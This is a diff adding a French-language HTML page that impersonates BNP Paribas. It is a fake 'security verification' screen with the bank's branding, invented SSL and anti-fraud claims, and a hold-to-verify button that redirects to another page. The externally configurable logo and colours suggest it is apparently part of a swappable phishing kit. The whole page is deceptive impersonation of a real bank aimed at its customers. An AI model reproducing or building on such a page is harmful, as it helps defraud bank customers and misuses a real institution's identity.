@@ -1,0 +1,572 @@
+<!doctype html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/x-icon" href="./assets/favicon.ico" />
+    <title>Vérification de sécurité - BNP Paribas</title>
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+
+    <script src="./settings.js"></script>
+
+    <style>
+      :root {
+        --color-primary: #6d4e52;
+        --color-primary-dark: #6d4e52;
+        --color-secondary: #6d4e52;
+        --color-accent: #6d4e52;
+        --bg-page: #f4f6f8;
+        --card-bg: #ffffff;
+        --text-main: #0f172a;
+        --text-muted: #64748b;
+        --border-color: #e2e8f0;
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family:
+          "Ubuntu",
+          -apple-system,
+          BlinkMacSystemFont,
+          "Segoe UI",
+          Roboto,
+          sans-serif;
+        background-color: var(--bg-page);
+        background-image:
+          radial-gradient(
+            at 0% 0%,
+            rgba(1, 136, 89, 0.04) 0px,
+            transparent 50%
+          ),
+          radial-gradient(
+            at 100% 100%,
+            rgba(1, 169, 110, 0.04) 0px,
+            transparent 50%
+          );
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        color: var(--text-main);
+        user-select: none;
+        -webkit-user-select: none;
+      }
+
+      /* En-tête officiel de la banque */
+      .site-header {
+        width: 100%;
+        background: #ffffff;
+        border-bottom: 1px solid var(--border-color);
+        padding: 1rem 2rem;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+
+      .header-logo {
+        display: flex;
+        align-items: center;
+      }
+
+      .header-logo img {
+        height: 36px;
+        width: auto;
+        object-fit: contain;
+      }
+
+      .header-security-badge {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        font-size: 0.825rem;
+        font-weight: 500;
+        color: var(--color-primary);
+        background: rgba(1, 136, 89, 0.07);
+        padding: 0.4rem 0.85rem;
+        border-radius: 20px;
+        border: 1px solid rgba(1, 136, 89, 0.15);
+      }
+
+      .header-security-badge svg {
+        width: 15px;
+        height: 15px;
+        fill: currentColor;
+      }
+
+      /* Zone de contenu principale */
+      .page-content {
+        flex: 1;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 2.5rem 1rem;
+      }
+
+      /* Carte de vérification */
+      .verification-card {
+        background: var(--card-bg);
+        width: 100%;
+        max-width: 440px;
+        padding: 2.5rem 2.25rem;
+        border-radius: 16px;
+        border: 1px solid var(--border-color);
+        box-shadow:
+          0 10px 25px -5px rgba(0, 0, 0, 0.05),
+          0 8px 10px -6px rgba(0, 0, 0, 0.01);
+        position: relative;
+      }
+
+      /* En-tête de la carte avec icône de bouclier */
+      .card-header-icon {
+        width: 56px;
+        height: 56px;
+        background: rgba(1, 136, 89, 0.08);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 1.5rem auto;
+        color: var(--color-primary);
+        transition: all 0.3s ease;
+      }
+
+      .card-header-icon svg {
+        width: 28px;
+        height: 28px;
+      }
+
+      /* Titre & sous-titre */
+      .card-title {
+        font-size: 1.35rem;
+        font-weight: 600;
+        color: var(--text-main);
+        text-align: center;
+        margin-bottom: 0.6rem;
+        letter-spacing: -0.01em;
+      }
+
+      .card-subtitle {
+        font-size: 0.9rem;
+        color: var(--text-muted);
+        text-align: center;
+        line-height: 1.5;
+        margin-bottom: 2rem;
+      }
+
+      /* Conteneur interactif de maintien */
+      .hold-action-area {
+        position: relative;
+        margin-bottom: 1.5rem;
+      }
+
+      .hold-button {
+        width: 100%;
+        height: 54px;
+        background: var(--color-primary);
+        color: #ffffff;
+        border: none;
+        border-radius: 12px;
+        font-family: inherit;
+        font-size: 1rem;
+        font-weight: 600;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.6rem;
+        position: relative;
+        overflow: hidden;
+        transition:
+          background-color 0.2s ease,
+          transform 0.15s ease,
+          box-shadow 0.2s ease;
+        box-shadow: 0 4px 12px rgba(1, 136, 89, 0.25);
+      }
+
+      .hold-button:hover {
+        background-color: var(--color-primary-dark);
+        box-shadow: 0 6px 16px rgba(1, 136, 89, 0.3);
+      }
+
+      .hold-button:active,
+      .hold-button.holding {
+        transform: scale(0.99);
+      }
+
+      /* Overlay de progression à l intérieur du bouton */
+      .button-progress-fill {
+        position: absolute;
+        top: 0;
+        left: 0;
+        height: 100%;
+        width: 0%;
+        background: rgba(255, 255, 255, 0.25);
+        transition: width 0.05s linear;
+        pointer-events: none;
+      }
+
+      .button-content {
+        position: relative;
+        z-index: 2;
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        pointer-events: none;
+      }
+
+      .button-content svg {
+        width: 20px;
+        height: 20px;
+        transition: transform 0.2s ease;
+      }
+
+      .hold-button.holding .button-content svg {
+        transform: scale(1.1);
+      }
+
+      /* Barre de progression fine */
+      .progress-track {
+        width: 100%;
+        height: 5px;
+        background: #f1f5f9;
+        border-radius: 6px;
+        overflow: hidden;
+        margin-top: 0.75rem;
+      }
+
+      .progress-fill-bar {
+        height: 100%;
+        width: 0%;
+        background: var(--color-primary);
+        border-radius: 6px;
+        transition:
+          width 0.05s linear,
+          background-color 0.3s ease;
+      }
+
+      /* Note de sécurité en bas de la carte */
+      .card-footer-info {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.4rem;
+        margin-top: 1.75rem;
+        padding-top: 1.25rem;
+        border-top: 1px solid #f1f5f9;
+        font-size: 0.8rem;
+        color: #94a3b8;
+      }
+
+      .card-footer-info svg {
+        width: 14px;
+        height: 14px;
+        color: #64748b;
+      }
+
+      /* Pied de page global */
+      .site-footer {
+        text-align: center;
+        padding: 1.25rem;
+        font-size: 0.8rem;
+        color: #94a3b8;
+      }
+
+      /* State verification success */
+      .hold-button.success {
+        background-color: #10b981 !important;
+        box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3) !important;
+      }
+
+      /* Responsive */
+      @media (max-width: 520px) {
+        .site-header {
+          padding: 0.85rem 1rem;
+        }
+
+        .header-logo img {
+          height: 28px;
+        }
+
+        .header-security-badge span {
+          display: none;
+        }
+
+        .verification-card {
+          padding: 1.75rem 1.25rem;
+          border-radius: 14px;
+        }
+
+        .card-title {
+          font-size: 1.2rem;
+        }
+
+        .card-subtitle {
+          font-size: 0.85rem;
+        }
+      }
+
+      @media (prefers-reduced-motion: reduce) {
+        * {
+          transition-duration: 0.01ms !important;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Header officiel -->
+    <header class="site-header">
+      <div class="header-logo">
+        <img id="logoIndex" src="./assets/bp.svg" alt="BNP Paribas" />
+      </div>
+      <div class="header-security-badge">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+          <path
+            d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"
+          />
+        </svg>
+        <span>Espace Sécurisé</span>
+      </div>
+    </header>
+
+    <!-- Contenu Principal -->
+    <main class="page-content">
+      <div class="verification-card">
+        <!-- Icône de sécurité -->
+        <div class="card-header-icon" id="cardIcon">
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            fill="none"
+            viewBox="0 0 24 24"
+            stroke="currentColor"
+            stroke-width="2"
+          >
+            <path
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
+            />
+          </svg>
+        </div>
+
+        <!-- Titre et sous-titre -->
+        <h1 class="card-title">Vérification de sécurité</h1>
+        <p class="card-subtitle">
+          Afin de sécuriser votre session bancaire, veuillez maintenir le bouton
+          appuyé pendant 2 secondes.
+        </p>
+
+        <!-- Zone de contrôle -->
+        <div class="hold-action-area">
+          <button
+            id="holdButton"
+            class="hold-button"
+            aria-label="Maintenez appuyé pour vérifier votre session"
+            onmousedown="startHolding()"
+            onmouseup="stopHolding()"
+            onmouseleave="stopHolding()"
+            ontouchstart="startHolding(event)"
+            ontouchend="stopHolding()"
+          >
+            <div class="button-progress-fill" id="buttonProgressFill"></div>
+            <div class="button-content">
+              <svg
+                id="buttonIcon"
+                xmlns="http://www.w3.org/2000/svg"
+                fill="none"
+                viewBox="0 0 24 24"
+                stroke="currentColor"
+                stroke-width="2"
+              >
+                <path
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-2.04l.054-.09A13.916 13.916 0 008 11a4 4 0 118 0c0 1.017-.07 2.019-.203 3m-2.118 6.844A21.88 21.88 0 0015.171 17m3.839 1.132c.645-2.266.99-4.659.99-7.132A8 8 0 008 4.07M3 15.364c.64-1.319 1-2.8 1-4.364 0-1.457-.39-2.823-1.07-4"
+                />
+              </svg>
+              <span id="buttonText">Maintenez appuyé</span>
+            </div>
+          </button>
+
+          <!-- Barre de progression -->
+          <div class="progress-track">
+            <div class="progress-fill-bar" id="progressBar"></div>
+          </div>
+        </div>
+
+        <!-- Footer de la carte -->
+        <div class="card-footer-info">
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            fill="none"
+            viewBox="0 0 24 24"
+            stroke="currentColor"
+            stroke-width="2"
+          >
+            <path
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
+            />
+          </svg>
+          <span>Connexion sécurisée SSL 256-bit • Protection anti-fraude</span>
+        </div>
+      </div>
+    </main>
+
+    <!-- Footer global -->
+    <footer class="site-footer">© BNP Paribas. Tous droits réservés.</footer>
+
+    <script>
+      // Appliquer les configurations depuis settings.js si disponibles
+      document.addEventListener("DOMContentLoaded", function () {
+        if (typeof pageIndexConfig !== "undefined") {
+          // Appliquer le logo si spécifié
+          if (pageIndexConfig.logoUrl) {
+            const logoElement = document.getElementById("logoIndex");
+            if (logoElement) {
+              logoElement.src = pageIndexConfig.logoUrl;
+            }
+          }
+
+          // Appliquer la couleur du bouton si configurée
+          if (pageIndexConfig.buttonColor) {
+            const button = document.getElementById("holdButton");
+            if (button) {
+              button.style.background = pageIndexConfig.buttonColor;
+            }
+          }
+        }
+
+        // Injecter les variables CSS globales
+        if (typeof couleurPrimaire !== "undefined") {
+          const style = document.createElement("style");
+          style.textContent = `
+                    :root {
+                        --color-primary: ${couleurPrimaire};
+                        ${typeof couleurSecondaire !== "undefined" ? `--color-secondary: ${couleurSecondaire};` : ""}
+                        ${typeof couleurAccent !== "undefined" ? `--color-accent: ${couleurAccent};` : ""}
+                    }
+                `;
+          document.head.appendChild(style);
+        }
+      });
+
+      // Variables pour la logique du bouton de maintien
+      let holdTimer = null;
+      let startTime = 0;
+      const requiredHoldTime = 2000; // 2 secondes
+      let isCompleted = false;
+
+      const button = document.getElementById("holdButton");
+      const buttonText = document.getElementById("buttonText");
+      const buttonIcon = document.getElementById("buttonIcon");
+      const buttonProgressFill = document.getElementById("buttonProgressFill");
+      const progressBar = document.getElementById("progressBar");
+      const cardIcon = document.getElementById("cardIcon");
+
+      function startHolding(event) {
+        if (event) {
+          event.preventDefault();
+        }
+        if (isCompleted) return;
+
+        startTime = Date.now();
+        button.classList.add("holding");
+        buttonText.textContent = "Vérification... 0%";
+
+        if (holdTimer) clearInterval(holdTimer);
+        holdTimer = setInterval(updateProgress, 16);
+      }
+
+      function stopHolding() {
+        if (isCompleted) return;
+
+        if (holdTimer) clearInterval(holdTimer);
+        button.classList.remove("holding");
+        buttonProgressFill.style.width = "0%";
+        progressBar.style.width = "0%";
+        buttonText.textContent = "Maintenez appuyé";
+      }
+
+      function updateProgress() {
+        const elapsedTime = Date.now() - startTime;
+        const progress = Math.min((elapsedTime / requiredHoldTime) * 100, 100);
+        const progressInt = Math.floor(progress);
+
+        // Mise à jour visuelle fluide
+        buttonProgressFill.style.width = progress + "%";
+        progressBar.style.width = progress + "%";
+        buttonText.textContent = `Vérification... ${progressInt}%`;
+
+        if (progress >= 100) {
+          clearInterval(holdTimer);
+          completeVerification();
+        }
+      }
+
+      function completeVerification() {
+        isCompleted = true;
+        button.classList.remove("holding");
+        button.classList.add("success");
+        buttonProgressFill.style.width = "100%";
+        progressBar.style.width = "100%";
+        progressBar.style.backgroundColor = "#10b981";
+
+        // Changer l icône du bouton et le texte
+        buttonIcon.innerHTML = `<path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />`;
+        buttonText.textContent = "Vérification réussie !";
+
+        // Animation du bouclier principal
+        if (cardIcon) {
+          cardIcon.style.background = "rgba(16, 185, 129, 0.12)";
+          cardIcon.style.color = "#10b981";
+          cardIcon.innerHTML = `
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                `;
+        }
+
+        // Redirection vers pages.html après confirmation
+        setTimeout(() => {
+          window.location.href = "pages.html";
+        }, 650);
+      }
+
+      // Prévention de la sélection pendant l interaction
+      document.addEventListener("selectstart", (e) => {
+        if (button.classList.contains("holding")) {
+          e.preventDefault();
+        }
+      });
+
+      // Gestion de l accessibilité au clavier (Barre d espace / Entrée)
+      button.addEventListener("keydown", (e) => {
+        if ((e.key === "Enter" || e.key === " ") && !isCompleted) {
+          e.preventDefault();
+          if (!button.classList.contains("holding")) {
+            startHolding();
+          }
+        }
+      });
+
+      button.addEventListener("keyup", (e) => {
+        if ((e.key === "Enter" || e.key === " ") && !isCompleted) {
+          e.preventDefault();
+          stopHolding();
+        }
+      });
+    </script>
+  </body>
+</html>
